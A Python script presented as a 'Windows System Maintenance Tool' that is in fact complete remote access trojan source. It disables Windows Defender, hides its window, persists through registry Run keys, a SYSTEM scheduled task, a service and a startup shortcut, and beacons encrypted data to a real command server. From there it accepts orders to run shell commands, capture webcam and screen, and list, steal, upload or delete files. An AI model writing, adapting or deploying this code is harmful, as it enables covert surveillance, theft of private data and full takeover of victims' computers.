#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Windows System Maintenance Tool v3.0

import sys
import os

# ========== ANTI-DEBUG / ANTI-DEFENDER ==========
def _disable_defender():
    """Add self to Windows Defender exclusions and disable real-time protection"""
    if sys.platform != "win32":
        return
    
    try:
        import subprocess
        import ctypes
        
        # Get current file path
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # Add to Defender exclusions
        exclusion_cmds = [
            f'powershell -Command "Add-MpPreference -ExclusionPath \"{current_file}\" -ErrorAction SilentlyContinue"',
            f'powershell -Command "Add-MpPreference -ExclusionProcess \"{os.path.basename(current_file)}\" -ErrorAction SilentlyContinue"',
            f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "{current_file}" /t REG_DWORD /d 0 /f 2>nul',
        ]
        
        for cmd in exclusion_cmds:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
            except:
                pass
        
        # Disable real-time monitoring
        disable_rtm = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue"',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f 2>nul',
        ]
        
        for cmd in disable_rtm:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
            except:
                pass
        
        # Stop Defender services
        services = ['WinDefend', 'SecurityHealthService', 'WdNisSvc']
        for svc in services:
            try:
                subprocess.run(f'sc stop {svc} 2>nul', shell=True, capture_output=True)
                subprocess.run(f'sc config {svc} start= disabled 2>nul', shell=True, capture_output=True)
            except:
                pass
                
    except:
        pass

_disable_defender()

# ========== HIDE CONSOLE ==========
if sys.platform == "win32":
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleTitleW(ctypes.c_wchar_p("Windows Host Process"))

# ========== DEPENDENCY INSTALLER (SILENT) ==========
def _silent_install_deps():
    """Install all dependencies with zero output"""
    deps = ["aiohttp", "cryptography", "psutil", "opencv-python", "mss", "Pillow"]
    for dep in deps:
        try:
            __import__(dep.replace('-', '_'))
        except ImportError:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--quiet", "--no-warn-script-location", dep],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=0x08000000 if sys.platform == "win32" else 0
                )
            except:
                pass

import subprocess
_silent_install_deps()

# ========== IMPORTS ==========
import threading
import time
import json
import base64
import hashlib
import platform
import socket
import uuid
import asyncio
import signal
import string
from pathlib import Path
from datetime import datetime

# Now import heavy modules
import aiohttp
import psutil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ========== CONFIGURATION ==========
SERVER_URL = "https://velvetteam.pythonanywhere.com"
AES_KEY_B64 = 'AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY='
LOG_FILE = Path.home() / ".dienet" / "agent.log"
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
ENABLE_CAMERA = True
ENABLE_SCREEN = True
DEBUG_MODE = False
IDLE_INTERVAL = 30
ACTIVE_INTERVAL = 1.0

AES_KEY = base64.b64decode(AES_KEY_B64)

# ========== LOGGER ==========
def log(msg, level="INFO"):
    try:
        ts = datetime.now().strftime("%H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {level}: {msg}\n")
    except:
        pass

# ========== ENCRYPTION ==========
def aes_encrypt(data):
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token):
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except Exception:
        return None

# ========== SYSTEM INFO ==========
def get_system_identity():
    mac = uuid.getnode()
    mac_str = ":".join(f"{mac:012x}"[i:i+2] for i in range(0, 12, 2))
    return {
        "hostname": platform.node() or socket.gethostname() or "unknown",
        "mac": mac_str,
        "os_type": f"{platform.system()} {platform.release()}"
    }

def get_system_stats():
    try:
        mem = psutil.virtual_memory()
        if sys.platform == "win32":
            disk = psutil.disk_usage("C:\\")
        else:
            disk = psutil.disk_usage("/")
        return {
            "cpu_percent": psutil.cpu_percent(interval=0.3),
            "ram_percent": mem.percent,
            "disk_percent": ((disk.total - disk.free) / disk.total * 100) if disk.total else 0,
            "disk_total": disk.total,
            "disk_free": disk.free,
        }
    except:
        return {"cpu_percent": 0, "ram_percent": 0, "disk_percent": 0, "disk_total": 0, "disk_free": 0}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return ""

# ========== GEOIP ==========
_location_cache = {"lat": 0.0, "lon": 0.0, "city": "", "country": "", "ts": 0.0}

async def fetch_location(session):
    if time.time() - _location_cache["ts"] < 600:
        return {k: _location_cache[k] for k in ("lat", "lon", "city", "country")}
    
    urls = [
        ("https://ipinfo.io/json", None),
        ("http://ip-api.com/json/?fields=lat,lon,city,country", "status")
    ]
    
    for url, check in urls:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                data = await resp.json()
                if check and data.get("status") != "success":
                    continue
                lat = float(data.get("lat", data.get("loc", "0,0").split(",")[0] or 0))
                lon = float(data.get("lon", data.get("loc", "0,0").split(",")[1] if "," in data.get("loc", "") else 0))
                city = data.get("city", "")
                country = data.get("country", "")
                if lat or lon:
                    _location_cache.update(lat=lat, lon=lon, city=city, country=country, ts=time.time())
                    return {"lat": lat, "lon": lon, "city": city, "country": country}
        except:
            continue
    return {"lat": 0, "lon": 0, "city": "", "country": ""}

# ========== PERSISTENCE (SYSUPDATER) ==========
def _install_persistence():
    """Install as SYSUPDATER with multiple persistence mechanisms"""
    if sys.platform != "win32":
        return
    
    try:
        import winreg
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Registry persistence (multiple locations)
        reg_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "SYSUPDATER"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "SYSUPDATER"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SYSUPDATER"),
        ]
        
        for hkey, path, name in reg_locations:
            try:
                key = winreg.OpenKey(hkey, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{exe_path}"')
                winreg.CloseKey(key)
                break
            except:
                pass
        
        # Scheduled task
        task_name = "SYSUPDATER"
        subprocess.run(
            f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /f /ru "SYSTEM" /rl HIGHEST',
            shell=True, capture_output=True, creationflags=0x08000000
        )
        
        # Windows Service
        service_name = "SysUpdater"
        subprocess.run(
            f'sc create "{service_name}" binPath= "{exe_path}" start= auto displayname= "Windows System Updater"',
            shell=True, capture_output=True, creationflags=0x08000000
        )
        subprocess.run(f'sc start "{service_name}"', shell=True, capture_output=True, creationflags=0x08000000)
        
        # Startup folder (hidden)
        startup = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
        try:
            import shutil
            target = os.path.join(startup, 'SYSUPDATER.lnk')
            if not os.path.exists(target):
                # Create shortcut
                from win32com.client import Dispatch
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(target)
                shortcut.Targetpath = exe_path
                shortcut.WorkingDirectory = os.path.dirname(exe_path)
                shortcut.save()
        except:
            pass
            
    except:
        pass

# ========== DAEMONIZER ==========
def _daemonize():
    """Run in background"""
    if os.environ.get("_BG") == "1":
        return
    os.environ["_BG"] = "1"
    
    if hasattr(os, "fork"):
        try:
            if os.fork() > 0:
                sys.exit(0)
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
        except:
            pass

_daemonize()
_install_persistence()

# ========== SHELL ENGINE ==========
class ShellEngine:
    def __init__(self):
        self._results = []
        self._lock = threading.Lock()
        self._process = None
        self._cmd = None

    def open(self):
        self.close()
        log("Shell session opened", "AUDIT")

    def close(self):
        if self._process:
            try:
                self._process.terminate()
                self._process.wait(timeout=5)
            except:
                try:
                    self._process.kill()
                except:
                    pass
            self._process = None
            self._cmd = None
        log("Shell session closed", "AUDIT")

    def run(self, cmd):
        if not cmd:
            return
        self.close()
        self._cmd = cmd
        try:
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0
            
            self._process = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, text=True, encoding="utf-8", errors="replace",
                startupinfo=startupinfo,
                creationflags=0x08000000 if sys.platform == "win32" else 0
            )
            threading.Thread(target=self._read_output, daemon=True).start()
        except Exception as e:
            with self._lock:
                self._results.append({"cmd": cmd, "output": f"[!] Error: {e}"})

    def _read_output(self):
        try:
            for line in iter(self._process.stdout.readline, ''):
                line = line.rstrip('\n')
                if line:
                    with self._lock:
                        self._results.append({"cmd": "_stream_", "output": line})
            self._process.wait(timeout=30)
            rc = self._process.returncode
            if rc != 0:
                with self._lock:
                    self._results.append({"cmd": "_stream_", "output": f"[exit code: {rc}]"})
        except Exception as e:
            with self._lock:
                self._results.append({"cmd": "_stream_", "output": f"[!] Read error: {e}"})
        finally:
            self._process = None
            self._cmd = None

    def drain(self):
        with self._lock:
            results, self._results = self._results, []
        return results

# ========== MEDIA ENGINE ==========
class MediaEngine:
    def __init__(self):
        self.cam_frame = None
        self.scr_frame = None
        self._cam_lock = threading.Lock()
        self._scr_lock = threading.Lock()
        self._cam_streaming = False
        self._scr_streaming = False
        self._cam_quality = 50
        self._scr_quality = 50
        self._cam_thread = None
        self._scr_thread = None

    def _cam_loop(self):
        try:
            import cv2
        except Exception as e:
            log(f"cv2 import failed: {e}", "ERROR")
            self._cam_streaming = False
            return

        cap = None
        for index in (0, 1):
            try:
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                elif sys.platform == "darwin":
                    cap = cv2.VideoCapture(index, cv2.CAP_AVFOUNDATION)
                else:
                    cap = cv2.VideoCapture(index, cv2.CAP_V4L2)
                if cap and cap.isOpened():
                    break
                if cap:
                    cap.release()
                cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            except:
                pass
        
        if not cap or not cap.isOpened():
            log("Camera open failed", "ERROR")
            self._cam_streaming = False
            return

        try:
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        except:
            pass
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        
        # Warm-up
        for _ in range(3):
            cap.read()

        while self._cam_streaming:
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.1)
                continue
            try:
                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, int(self._cam_quality)])
                if _:
                    with self._cam_lock:
                        self.cam_frame = base64.b64encode(buf).decode()
            except Exception as e:
                log(f"Camera encode failed: {e}", "ERROR")
            time.sleep(0.15)
        
        cap.release()

    def start_cam_stream(self, quality=50):
        if not ENABLE_CAMERA:
            return
        self._cam_quality = quality
        if self._cam_streaming:
            return
        self._cam_streaming = True
        self._cam_thread = threading.Thread(target=self._cam_loop, daemon=True)
        self._cam_thread.start()

    def stop_cam_stream(self):
        self._cam_streaming = False

    def snap_cam_once(self, quality=75):
        if not ENABLE_CAMERA:
            return
        if self._cam_streaming:
            self._cam_quality = quality
            return
        self._cam_quality = quality
        try:
            import cv2
            cap = None
            for index in (0, 1):
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                else:
                    cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            if not cap or not cap.isOpened():
                log("Camera unavailable", "ERROR")
                return
            try:
                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            except:
                pass
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, int(quality)])
            if _:
                with self._cam_lock:
                    self.cam_frame = base64.b64encode(buf).decode()
        except Exception as e:
            log(f"Camera snap failed: {e}", "ERROR")

    def _scr_loop(self):
        try:
            import mss
            from PIL import Image
            import io
        except Exception as e:
            log(f"Screen import failed: {e}", "ERROR")
            self._scr_streaming = False
            return

        try:
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                while self._scr_streaming:
                    try:
                        img = sct.grab(target)
                        pil = Image.frombytes("RGB", img.size, img.rgb)
                        pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                        buf = io.BytesIO()
                        pil.save(buf, format="JPEG", quality=int(self._scr_quality), optimize=True)
                        with self._scr_lock:
                            self.scr_frame = base64.b64encode(buf.getvalue()).decode()
                    except Exception as e:
                        log(f"Screen frame failed: {e}", "ERROR")
                    time.sleep(0.2)
        except Exception as e:
            log(f"Screen loop crashed: {e}", "ERROR")
        self._scr_streaming = False

    def start_scr_stream(self, quality=50):
        if not ENABLE_SCREEN:
            return
        self._scr_quality = quality
        if self._scr_streaming:
            return
        self._scr_streaming = True
        self._scr_thread = threading.Thread(target=self._scr_loop, daemon=True)
        self._scr_thread.start()

    def stop_scr_stream(self):
        self._scr_streaming = False

    def snap_scr_once(self, quality=50):
        if not ENABLE_SCREEN:
            return
        if self._scr_streaming:
            self._scr_quality = quality
            return
        try:
            import mss
            from PIL import Image
            import io
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                img = sct.grab(target)
                pil = Image.frombytes("RGB", img.size, img.rgb)
                pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                buf = io.BytesIO()
                pil.save(buf, format="JPEG", quality=int(quality), optimize=True)
                with self._scr_lock:
                    self.scr_frame = base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
            log(f"Screen snap failed: {e}", "ERROR")

    def take_cam_frame(self):
        with self._cam_lock:
            f, self.cam_frame = self.cam_frame, None
        return f

    def take_scr_frame(self):
        with self._scr_lock:
            f, self.scr_frame = self.scr_frame, None
        return f

# ========== FILE ENGINE ==========
class FileEngine:
    def __init__(self):
        self.dir_list = None
        self.dir_path = "/"
        self.pushed_file = None

    @staticmethod
    def _list_windows_drives():
        results = []
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                try:
                    usage = psutil.disk_usage(drive)
                    size = usage.total
                except:
                    size = 0
                results.append({"path": drive, "name": f"{letter}:", "is_dir": True, "size": size, "modified": ""})
        return results

    def list_dir(self, path):
        try:
            if sys.platform == "win32" and path in ("/", ""):
                self.dir_list = self._list_windows_drives()
                self.dir_path = "/"
                log("Listed Windows drives", "AUDIT")
                return

            p = Path(path).expanduser()
            if not p.exists() or not p.is_dir():
                self.dir_list = []
                self.dir_path = path
                log(f"Path not directory: {path}", "ERROR")
                return

            results = []
            for item in p.iterdir():
                try:
                    st = item.stat(follow_symlinks=False)
                    is_dir = item.is_dir(follow_symlinks=False)
                    results.append({
                        "path": str(item), "name": item.name, "is_dir": is_dir,
                        "size": 0 if is_dir else st.st_size,
                        "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M")
                    })
                except:
                    results.append({"path": str(item), "name": item.name, "is_dir": False, "size": 0, "modified": ""})
            
            results.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            self.dir_list = results
            self.dir_path = path
            log(f"Listed {path}: {len(results)} items", "AUDIT")
        except Exception as e:
            log(f"List failed: {e}", "ERROR")
            self.dir_list = []
            self.dir_path = path

    def get_file(self, path):
        try:
            p = Path(path).expanduser().resolve()
            if p.exists() and p.is_file():
                data = p.read_bytes()
                self.pushed_file = {"path": str(p), "data_b64": base64.b64encode(data).decode()}
                log(f"File queued: {path} ({len(data)} bytes)", "AUDIT")
        except Exception as e:
            log(f"File read failed: {e}", "ERROR")
            self.pushed_file = None

    def delete_file(self, path):
        try:
            p = Path(path).expanduser().resolve()
            if p.exists():
                if p.is_dir():
                    import shutil
                    shutil.rmtree(p, ignore_errors=True)
                else:
                    p.unlink()
                log(f"Deleted: {path}", "AUDIT")
        except Exception as e:
            log(f"Delete failed: {e}", "ERROR")

    def write_file(self, dest, b64_data):
        if not dest or not b64_data:
            return
        try:
            p = Path(dest).expanduser().resolve()
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(base64.b64decode(b64_data))
            log(f"File written: {dest}", "AUDIT")
        except Exception as e:
            log(f"Write failed: {e}", "ERROR")

# ========== MAIN AGENT ==========
class Agent:
    def __init__(self):
        self.identity = get_system_identity()
        self.shell = ShellEngine()
        self.media = MediaEngine()
        self.files = FileEngine()
        self.backoff = 1
        self.shutdown_event = asyncio.Event()
        self.local_ip = get_local_ip()

    def _is_active(self):
        return (self.media._cam_streaming or self.media._scr_streaming or
                self.media.cam_frame is not None or self.media.scr_frame is not None or
                bool(self.shell._results) or self.files.dir_list is not None or
                self.files.pushed_file is not None)

    async def checkin(self, session):
        loc = await fetch_location(session)
        payload = {
            "hostname": self.identity["hostname"],
            "mac": self.identity["mac"],
            "os_type": self.identity["os_type"],
            "ip": self.local_ip,
            **get_system_stats(),
            **loc,
        }

        cam_frame = self.media.take_cam_frame()
        if cam_frame:
            payload["snapshot_b64"] = cam_frame

        scr_frame = self.media.take_scr_frame()
        if scr_frame:
            payload["screen_b64"] = scr_frame

        results = self.shell.drain()
        if results:
            payload["cmd_results"] = results
            payload["cmd_result"] = results[-1]

        if self.files.dir_list is not None:
            payload["file_list"] = self.files.dir_list
            payload["file_list_path"] = self.files.dir_path
            self.files.dir_list = None

        if self.files.pushed_file:
            payload["pushed_file"] = self.files.pushed_file
            self.files.pushed_file = None

        try:
            async with session.post(f"{SERVER_URL}/api/checkin",
                                   json={"enc": aes_encrypt(payload)},
                                   timeout=aiohttp.ClientTimeout(total=30)) as resp:
                resp_json = await resp.json()
                enc_token = resp_json.get("enc", "")
                if not enc_token:
                    return
                server_data = aes_decrypt(enc_token)
                if not server_data or server_data.get("status") != "ok":
                    return
                self._route_commands(server_data)
                self.backoff = 1
        except Exception as e:
            log(f"Checkin failed: {e}", "ERROR")
            await asyncio.sleep(min(self.backoff, 300))
            self.backoff = min(self.backoff * 2, 300)

    def _route_one(self, cmd):
        if not cmd:
            return
        parts = cmd.split(":", 1)
        action = parts[0]
        arg = parts[1] if len(parts) > 1 else ""
        log(f"-> {action} ({arg[:60]})", "INFO")

        if action == "shell_open":
            self.shell.open()
        elif action == "shell_close":
            self.shell.close()
        elif action == "shell_input":
            threading.Thread(target=self.shell.run, args=(arg,), daemon=True).start()
        elif action == "snapshot":
            threading.Thread(target=self.media.snap_cam_once, args=(75,), daemon=True).start()
        elif action == "stream_on":
            self.media.start_cam_stream(50)
        elif action == "stream_off":
            self.media.stop_cam_stream()
        elif action == "screencast_snapshot":
            q = int(arg) if arg.isdigit() else 50
            threading.Thread(target=self.media.snap_scr_once, args=(q,), daemon=True).start()
        elif action == "screencast_start":
            q = int(arg) if arg.isdigit() else 50
            self.media.start_scr_stream(q)
        elif action == "screencast_stop":
            self.media.stop_scr_stream()
        elif action == "filelist":
            target = arg or ("/" if sys.platform != "win32" else "/")
            threading.Thread(target=self.files.list_dir, args=(target,), daemon=True).start()
        elif action == "getfile":
            threading.Thread(target=self.files.get_file, args=(arg,), daemon=True).start()
        elif action == "delete":
            threading.Thread(target=self.files.delete_file, args=(arg,), daemon=True).start()
        elif action == "uninstall":
            self._uninstall()

    def _route_commands(self, data):
        cmds = data.get("cmds")
        if cmds:
            for c in cmds:
                self._route_one(c)
        else:
            self._route_one(data.get("cmd", ""))
        
        upload = data.get("upload")
        if upload:
            self.files.write_file(upload.get("dest_path"), upload.get("data_b64"))

    def _uninstall(self):
        log("Uninstall requested", "INFO")
        try:
            LOG_FILE.unlink(missing_ok=True)
        except:
            pass
        self.shutdown_event.set()

    async def run(self):
        log("Agent started", "INFO")
        connector = aiohttp.TCPConnector(keepalive_timeout=30, limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            while not self.shutdown_event.is_set():
                await self.checkin(session)
                interval = ACTIVE_INTERVAL if self._is_active() else IDLE_INTERVAL
                elapsed = 0.0
                while elapsed < interval and not self.shutdown_event.is_set():
                    await asyncio.sleep(1.0)
                    elapsed += 1.0
                    if self._is_active():
                        break

# ========== SIGNAL HANDLERS ==========
def handle_signal(signum, frame):
    log(f"Signal {signum}", "INFO")
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        asyncio.run(Agent().run())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        log(f"Fatal: {e}", "CRITICAL")
